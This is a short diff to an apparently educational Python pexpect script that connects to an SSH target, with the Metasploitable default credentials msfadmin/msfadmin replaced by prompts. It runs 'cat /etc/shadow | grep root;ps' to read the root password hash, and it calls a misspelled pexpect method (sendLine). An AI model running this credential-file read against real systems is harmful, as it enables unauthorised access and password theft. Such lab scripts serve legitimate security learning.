@@ -4,6 +4,11 @@ import pexpect
 
 PROMPT = ["#", ">>>", ">", "\$"]
 
+def send_command(child, command):
+    child.sendLine(command)
+    child.expect(PROMPT)
+    print(child.before)
+
 def connect(user, host, password):
     ssh_newKey = "Are you sure you want to continue connecting?"
     connStr = f"ssh {user}@{host}"
@@ -23,9 +28,9 @@ def connect(user, host, password):
     return child
 
 def main():
-    host = ""
-    user = "msfadmin"
-    password = "msfadmin"
+    host = input("Enter the host target: ")
+    user = input("Enter SSH username: ")
+    password = input("Enter SSH password: ")
     child = connect(user, host, password)
     send_command(child, "cat /etc/shadow | grep root;ps")
 
